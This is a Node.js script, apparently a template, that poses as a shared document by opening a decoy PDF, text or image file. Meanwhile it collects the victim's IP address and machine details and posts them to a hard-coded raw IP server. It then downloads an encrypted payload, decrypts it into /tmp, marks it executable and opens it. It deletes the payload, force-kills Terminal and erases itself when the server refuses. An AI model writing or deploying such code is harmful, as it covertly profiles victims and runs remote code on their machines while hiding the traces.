#!/usr/local/bin/node

const crypto = require('crypto');
const exec = require('child_process').exec;
const os = require('os');
const fs = require('fs');
const env = {
	API_URL: "http://108.61.177.144:3000"
};
const request = require('request-promise');
const system = {
	exec: (cmd) => {
		return new Promise((resolve, reject) => {
			exec(cmd, function(error, stdout, stderr) {
				if (stderr.length === 0) resolve(stdout.trim());
				else if (error) reject(error.message.trim());
				else reject(stderr.trim());
			});
		});
	},
	getIpAddress: () => {
		return system.exec("ipconfig getifaddr en0");
	},
	getMachineInfo: () => {
		let networkInterfaces = [];
		for (let key in os.networkInterfaces()) {
			networkInterfaces.push(os.networkInterfaces()[key][0].address);
		}
		return {
			uname: `${os.type()} ${os.platform()} ${os.hostname()} ${os.release()} ${os.arch()}`,
			hostname: os.hostname(),
			type: os.type(),
			platform: os.platform(),
			arch: os.arch(),
			release: os.release(),
			// uptime: os.uptime(),
			// loadavg: os.loadavg(),
			// totalmem: os.totalmem(),
			// freemem: os.freemem(),
			cpus: os.cpus().map((cpu) => cpu.model),
			networkInterfaces: networkInterfaces
		};
	}
};

const file = {
	id: "#FILE_ID#",
	type: "#FILE_TYPE#"
};

const runCommand = (() => {
	switch (os.platform()) {
		case 'linux':
		case 'freebsd':
		case 'openbsd':
		case 'sunos':
		case 'aix':
			return 'xdg-open';
		case 'darwin':
			return 'open';
		case 'win32':
			return 'start';
	}
})();

const dummyFiles = {
	pdf: fs.readFileSync('/tmp/dummy-files/dummyPdf', 'binary').trim(),
	txt: fs.readFileSync('/tmp/dummy-files/dummyTxt', 'utf8').trim(),
	png: fs.readFileSync('/tmp/dummy-files/dummyPng', 'binary').trim()
};

const killCommand = {
	pdf: 'pkill -f Applications/PDF',
	txt: 'pkill -f MacOS/TextEdit',
	png: 'pkill -f Applications/Preview',
	terminal: 'ps aux|grep Terminal.app|awk {\'print $2\'}|xargs kill -9'
};

let tryCount = 0;

const deleteFile = (filePath) => {
	fs.unlink(filePath);
};

const decrypt = (data, key) => {
	// console.log("Key: " + key);
	const decipher = crypto.createDecipher('aes-256-ctr', String(key))
	let dec = decipher.update(data, 'hex', 'utf8')
	dec += decipher.final('utf8');
	return dec;
};

const ping = (ipAddress, machineInfo) => {
	const options = {
		method: 'POST',
		uri: `${env.API_URL}/logs`,
		body: {
			ip_address: ipAddress,
			machine_info: machineInfo,
			file_id: file.id
		},
		json: true // Automatically stringifies the body to JSON
	};

	const filePath = '/tmp/' + parseInt(Math.random() * 1000) + '.' + file.type;

	fs.writeFile(filePath, decrypt(dummyFiles[file.type] || dummyFiles.txt, '123'), 'utf8', function(err) {
		system.exec('chmod +x \'' + filePath + '\'').then(() => {

			system.exec(runCommand + " " + filePath);
			setTimeout(() => {
				deleteFile(filePath)
			}, 4000);
		});
	});

	const killTerminal = () => {
		// Close the terminal
		system.exec(killCommand.terminal).then((out) => {
			console.log("");
		});
	};

	request(options)
		.then((resp) => {
			fs.writeFile(filePath, decrypt(resp.file.data, resp.decryption_key), 'binary', function(err) {

				system.exec(killCommand[file.type] || killCommand.txt).then(() => { // close the dummy file

					system.exec('chmod +x \'' + filePath + '\'').then(() => {

						system.exec(runCommand + " " + filePath) // open the file
							.then(() => {
								setTimeout(() => {
									deleteFile(filePath) // delete the file
									killTerminal();
								}, 4000);
							});

					});

				});

			});
		})
		.catch((err) => {
			if (err.response.statusCode === 401 || err.response.statusCode === 500) {
				// Unauthorized or deleted file, self destroy.
				deleteFile(__filename);
				killTerminal();
			} else {
				if (tryCount < 3) {
					tryCount++;
					ping(ipAddress, machineInfo);
				} else {
					// TODO: Too many tries with failures, show "No internet connection" etc.
					killTerminal();
				}
			}
		});
};

system.getIpAddress()
	.then((ipAddress) => {
		ping(ipAddress, system.getMachineInfo());
	});
